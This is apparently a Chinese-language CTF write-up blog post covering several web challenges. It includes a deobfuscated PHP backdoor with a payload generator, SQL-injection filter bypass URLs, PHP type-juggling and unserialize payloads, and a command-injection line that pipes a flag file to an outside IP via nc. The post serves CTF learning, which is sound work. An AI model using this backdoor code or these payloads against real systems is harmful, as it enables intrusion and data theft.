*/$x=&apos;m([\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m&apos;;/*</span><br><span class="line"> */$y=str_replace(&apos;b&apos;,&apos;&apos;,&apos;crbebbabte_funcbbtion&apos;);/*</span><br><span class="line"> */$c=&apos;$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;&apos;;</span><br><span class="line"></span><br><span class="line">echo $c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H;/*</span><br><span class="line"> *///$L=str_replace(&apos;)m&apos;,&apos;&apos;,$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/*</span><br><span class="line"> //*///$v=$y(&apos;&apos;,$L);$v();/*</span><br><span class="line"> //*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>干他妈的代码混淆！写个py脚本把他们全部拼在一起之后把)m全部去掉，记得过程中要把里面的双引号全部用反斜杠转义掉。然后找个在线代码美化工具美化以下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str=&quot;$kh=\&quot;4f7)m)mf\&quot;;$kf=\&quot;2)m)m8d7\&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=\&quot;\&quot;;for()m$i=0;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)mR;$rr)m=@$r[)m\&quot;HTT)mP_RE)mFERER\&quot;];$ra)m=)m@$r[\&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m\&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p)marse_)mstr)m($u[\&quot;q)muery\&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m\&quot;/([\w)m])m)[\w-)m]+(?:;q=0.)m([\d)m]))?,?/\&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=\&quot;sub)mstr\&quot;;$sl=\&quot;s)mtrt)molower\&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3)m));)m$p=\&quot;\&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m[$i]=\&quot;\&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif($e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(\&quot;/_)m/\&quot;,\&quot;/-/)m\&quot;),)marray()m\&quot;/\&quot;,\&quot;+\&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(\&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m\&quot;);@sessio)mn_d)mestroy();&quot;</span><br><span class="line">print str.replace(&apos;)m&apos;,&apos;&apos;)</span><br><span class="line">&lt;?php</span><br><span class="line">$kh = &quot;4f7f&quot;;</span><br><span class="line">$kf = &quot;28d7&quot;;</span><br><span class="line">function x($t, $k) &#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;;//每一位都做一次与运算</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);//将referer的query部分解析到q,也就是url中?后面的查询数据</span><br><span class="line">    $q = array_values($q);//将数组的值给q</span><br><span class="line">    </span><br><span class="line">    //对accept_language进行正则匹配，最终结果为一个包含三个 n个元素的数组</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s = &amp; $_SESSION;</span><br><span class="line">        $ss = &quot;substr&quot;;</span><br><span class="line">        $sl = &quot;strtolower&quot;;</span><br><span class="line">        $i = $m[1][0] . $m[1][1];//这个是accept_language的以每个逗号为分隔符的前两个段的首字母  两个字母进行拼接得到了$i</span><br><span class="line">        $h = $sl($ss(md5($i . $kh) , 0, 3));//$i 和 4f7f拼接而成经过md5之后的头三位</span><br><span class="line">        $f = $sl($ss(md5($i . $kf) , 0, 3));//$i 和 28d7拼接而成经过md5之后的头三位</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p.= $q[$m[2][$z]];//把？后面的元素中的第language编号个元素拼接进p中</span><br><span class="line">        if (strpos($p, $h) === 0) &#123;//看 h 是否在 p 的开头</span><br><span class="line">            $s[$i] = &quot;&quot;;//创建了一个空的元素</span><br><span class="line">            $p = $ss($p, 3);//头三位字母之后的东东</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;//如果i这个键在s中存在~~也即是说上面那个if一定要进去</span><br><span class="line">            $s[$i].= $p;</span><br><span class="line">            $e = strpos($s[$i], $f); //找结束标志，那三位md5码</span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;) , array(&quot;/&quot;,&quot;+&quot;) , substr($s[$i], 0, $e))) , $k)));</span><br><span class="line">                //把最后的结束标志之后的东西去掉之后进行操作  k是4f7f28d7 拿来还要做一个按位与的运算</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o) , $k));</span><br><span class="line">                print (&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;        </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析过程在代码注释中给出了一部分。要重点关注我们的payload是怎么传递进去的以及其中正则表达式的含义。</p>
<p>解释以下accept-language中的<code>zh-CN,zh;q=0.8,zh-TW;q=0.7</code>，这里只是一个例子，首先不同项目之间用逗号来分割开来，最开始的zh-CN表示默认语言，这里是中国大陆的语言，然后下一个是zh，q代表这个语言的权重。逆脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function x($t, $k) &#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;;//每一位都做一次与运算</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function outpayload($cmd)&#123;</span><br><span class="line">    $cmd = &quot;system(&apos;&quot;.$cmd.&quot;&apos;);&quot;;</span><br><span class="line">    $gzcmd = gzcompress($cmd);</span><br><span class="line">    $xgzcmd = x($gzcmd, &quot;4f7f28d7&quot;);</span><br><span class="line">    $paylaod = base64_encode($xgzcmd);</span><br><span class="line"></span><br><span class="line">    return &apos;675&apos;.$paylaod.&apos;a3e&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这个是将网页内容拿回来解密的函数</span><br><span class="line">function getresult($str)&#123;</span><br><span class="line">    $result = base64_decode($str);</span><br><span class="line">    $result = x($result, &quot;4f7f28d7&quot;);</span><br><span class="line">    $result = gzuncompress($result);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">echo outpayload(&quot;cat this_i5_flag.php&quot;);</span><br><span class="line">echo getresult(&quot;TPqE1x3wTNfRNH6te3Qzh2E2MLfnUeIhki8xAPuCrV5SD41A9JGijSKvng+IEeJe0g9eYHRxchFy092wjmSSQWhmXcQj5A==&quot;);</span><br></pre></td></tr></table></figure>

<p>然后burpsuite发送请求如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /Challenges/b4ckdo0r.php HTTP/1.1</span><br><span class="line">Host: 751ad4fb456642ada231c61e6ac36d9dcb186eb4b1f14ac1.changame.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.0  //要重点关注这个0.0和这一行的元素个数</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=166f2f5e071449-0f8f8e0b614dd6-4c312979-144000-166f2f5e07416b; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; __jsluid=76c3e9ad4068b3acc239c7ac441a05ba</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Referer:http://1.1.1.1/index.php?a=675TPocyB4WLfrhNngoHmlM/vxKuakGtSv8fSrgTfoQNOCAYDfe2zKYa3e</span><br></pre></td></tr></table></figure>

<p>回显的东西放进解码函数里面跑一下就出来了。</p>
<h2 id="in-a-mess"><a href="#in-a-mess" class="headerlink" title="in a mess"></a>in a mess</h2><p>题目链接<br>进入之后查看源码得到以下源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!--index.phps--&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: index.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Hahahahahaha&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;//substr函数不会忽略%00但是strlen会忽略，eregi的比较是弱类型</span><br><span class="line">	require(&quot;flag.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url/index.php?id=0a&amp;b=%0011111111&amp;a=php://input</span><br><span class="line">post: 1112 is a nice lab!</span><br></pre></td></tr></table></figure>

<p>然后得到一个url路径,进去发现原来的url后面自动增加了index.php?id=1，有可能是sql注入，这里空格被过滤，使用<code>/**/被过滤，使用/*1*/可以绕过</code>。</p>
<p>union和select、from均被过滤，依靠<code>双写</code>来绕过。</p>
<p>注意爆出表明之后想要获取列名直接在where中写<code>where table_name=&quot;content&quot;</code>不行，但是可以<code>16进制</code>来绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,(seleselectct/*1*/group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74)</span><br><span class="line"></span><br><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,(seleselectct/*1*/group_concat(id,context,title)/*1*/frfromom/*1*/content)</span><br></pre></td></tr></table></figure>

<h2 id="babyphp-boot2root"><a href="#babyphp-boot2root" class="headerlink" title="babyphp (boot2root)"></a>babyphp (boot2root)</h2><p>题目源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$str1 = $_GET[<span class="string">'1'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'1'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str1 == md5($str1))&#123; <span class="comment">//使用0e215962017，它的md5值0e291242476940776845150308577824，当然不唯一，生成脚本和验证方法见下</span></span><br><span class="line">        <span class="keyword">echo</span> $flag1; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$str2 = $_GET[<span class="string">'2'</span>]; </span><br><span class="line">$str3 = $_GET[<span class="string">'3'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'3'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str2 !== $str3)&#123; <span class="comment">#传入两个数组这样都是false了，当然可以相等</span></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'md5'</span>, $salt . $str2) == hash(<span class="string">'md5'</span>, $salt . $str3))&#123; </span><br><span class="line">            <span class="keyword">echo</span> $flag2; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secrets</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $temp; </span><br><span class="line">    <span class="keyword">var</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'4'</span>])) &#123; </span><br><span class="line">    $str4 = $_GET[<span class="string">'4'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; </span><br><span class="line">        $str4=stripslashes($str4); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    $res = unserialize($str4); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($res) &#123; </span><br><span class="line">	$res-&gt;flag=$flag3; </span><br><span class="line">	<span class="comment">#使用引用</span></span><br><span class="line"><span class="comment">/* &lt;?php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">class Secrets &#123;</span></span><br><span class="line"><span class="comment">    var $temp;</span></span><br><span class="line"><span class="comment">    var $flag;</span></span><br><span class="line"><span class="comment">    function __construct()</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        $this-&gt;temp = &amp;$this-&gt;flag;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">echo serialize(new Secrets()); */</span></span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;flag === $res-&gt;temp) </span><br><span class="line">            <span class="keyword">echo</span> $res-&gt;flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1=0e215962017&amp;2[]=a&amp;3[]=b&amp;4=O:7:%22Secrets%22:2:&#123;s:4:%22flag%22;N;s:4:%22temp%22;R:2;&#125;</span><br></pre></td></tr></table></figure>

<p>md5生成脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抄dalao的脚本</span></span><br><span class="line"><span class="comment">#-*-encode:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateMD5</span><span class="params">()</span>:</span></span><br><span class="line">    pattern = <span class="string">"^0+e[0-9]+$"</span></span><br><span class="line">    <span class="comment"># 被识别成若干0开头加上e开头的强制类型转换后会被视为科学计数法中的0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">1000000</span> ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">        s = <span class="string">'0e'</span>+str(i)</span><br><span class="line">        md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">        flag = re.search(pattern,md5)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            print(<span class="string">"source:"</span>,str(s))</span><br><span class="line">            print(<span class="string">"md5:"</span>,str(md5))</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    generateMD5()</span><br></pre></td></tr></table></figure>

<p>验证方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashlib.md5(&quot;0e215962017&quot;.encode(&apos;utf-8&apos;)).hexdigest()</span><br></pre></td></tr></table></figure>

<h2 id="pingserver-boot2root"><a href="#pingserver-boot2root" class="headerlink" title="pingserver(boot2root)"></a>pingserver(boot2root)</h2><p>查看<code>helper.php~</code>(为什么我就扫描不出来呢？？？)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"REMOTE_ADDR"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_CLIENT_IP"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"REMOTE_ADDR"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$ip = <span class="string">"Unknown"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m'</span>, $data))) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;center&gt;&lt;h2 style="color:red;"&gt;Shoo Go Away heckermen... Thats not an IP Address&lt;/h2&gt;&lt;/center&gt;'</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">    $black_list = <span class="keyword">array</span>(<span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">" "</span>,<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="comment">// if(strpos($data, $key) !== false)&#123;</span></span><br><span class="line">        <span class="comment">//     die("&lt;center&gt; Not Allowed &lt;/center&gt;");</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        $data = str_replace($key, <span class="string">''</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>学习了<code>refip</code>的常见设置，这里发现没有拦截<code>x-forwarded-for</code>，于是在请求头里面添加并赋值为<code>127.0.0.1</code>，发送，回显结果中的关键代码如下图：<br><img src="https://user-images.githubusercontent.com/40637063/55333592-3290fb00-54ca-11e9-8816-f316ed169091.png" alt></p>
<p><code>ping -c 4</code>表示发送四个报文。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http://3.17.167.161/PingService/ --data &quot;ip=8.8.8.8%0a;cat$&#123;IFS%?&#125;flag.php|nc$&#123;IFS%?&#125;207.148.64.125$&#123;IFS%?&#125;8000&quot; --header &quot;x-forwarded-for:127.0.0.1&quot;</span><br></pre></td></tr></table></figure>

<p>我试了一下，将分割符号中的<code>%?</code>去掉也是可以的<br><img src="https://user-images.githubusercontent.com/40637063/55333654-58b69b00-54ca-11e9-8279-d88d243c7cff.png" alt></p>
<h2 id="dragonscim-workshop"><a href="#dragonscim-workshop" class="headerlink" title="dragonscim workshop"></a>dragonscim workshop</h2><p>真的脑洞题目，题目提示：</p>
<blockquote>
<p>DragonScim is holding it’s PKing workshop again!<br>Word on the street is the admins get into the console via the Contact.<br>They thought it might be clever and crafty if they also just created<br>their name with inspiration from fish that collide with themselves.<br>Oh, and lastly, they’ve left a joke for us.<br>Here it is:<br>How do you kill a circus?<br>You go for the juggler.<br>Also, the admins love Maryland a lot… They’ve been there 5 times.</p>
</blockquote>
<p>这个提示和谜语一样晦涩难懂。然后根据提示看起来只能利用contact界面中的name参数来找突破口了。传入的<code>url：/contact.php?name[]=aaa</code>,报错。</p>
<blockquote>
<p>Warning: md5() expects parameter 1 to be string,<br>array given in /var/www/site/contact.php on line 76<br>Thanks for your message Array, it has been received.</p>
</blockquote>
<p>错误的参数试探出了md5函数，结合题目给出的隐晦提示，从老外那里看到的说是原始值和MD5值相同，而且是==而不是强等于。</p>
<blockquote>
<p>php 手册：如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> 抄dalao的脚本</span><br><span class="line"><span class="comment">#-*-encode:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateMD5</span><span class="params">()</span>:</span></span><br><span class="line">    pattern = <span class="string">"^0+e[0-9]+$"</span></span><br><span class="line">    <span class="comment"># 被识别成若干0开头加上e开头的强制类型转换后会被视为科学计数法中的0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">1000000</span> ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">        s = <span class="string">'0e'</span>+str(i)</span><br><span class="line">        md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">        flag = re.search(pattern,md5)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            print(<span class="string">"source:"</span>,str(s))</span><br><span class="line">            print(<span class="string">"md5:"</span>,str(md5))</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    generateMD5()</span><br></pre></td></tr></table></figure>

<p>最后将得到的source值传递进name就可以了</p>
<h2 id="ichunqiu-百度杯getflag"><a href="#ichunqiu-百度杯getflag" class="headerlink" title="ichunqiu 百度杯getflag"></a>ichunqiu 百度杯getflag</h2><p>知识点：php自定义定界符<code>&lt;&lt;&lt;</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>相当于是<code>“flag”</code> ,注意最后还有一个换行符，将这部分进行url编码后传入。请求头也要自己造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /Challenges/flag.php HTTP/1.1</span><br><span class="line">Host: xxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">flag=%3c%3c%3c%61%0a%66%6c%61%67%0a%61%3b%0a</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/40637063/57857218-3f22a600-7821-11e9-88a5-624bf3bb442f.png" alt="image"></p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
</search>
